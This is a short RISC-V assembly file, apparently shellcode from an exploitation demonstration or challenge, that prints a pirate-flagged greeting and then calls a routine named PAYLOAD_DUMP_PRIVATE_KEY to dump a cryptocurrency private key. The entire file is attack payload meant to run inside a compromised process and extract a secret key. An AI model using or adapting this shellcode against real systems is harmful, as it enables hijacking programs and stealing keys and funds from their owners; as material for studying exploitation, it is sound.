/*#
 *# (c) 2018-2022 Hadrien Barral
 *# SPDX-License-Identifier: Apache-2.0
 */

.section .start
_start:
    .globl _start
    fence.i
    auipc a0, 0x0
    addi a0, a0, 28
    li a1, PAYLOAD_PUTS
    jalr a1
    li a1, PAYLOAD_DUMP_PRIVATE_KEY
    jalr a1
    j .
    .asciz "🏴‍☠️ Hello from shellcode 🙂, I will now dump the shitcoin private key…"
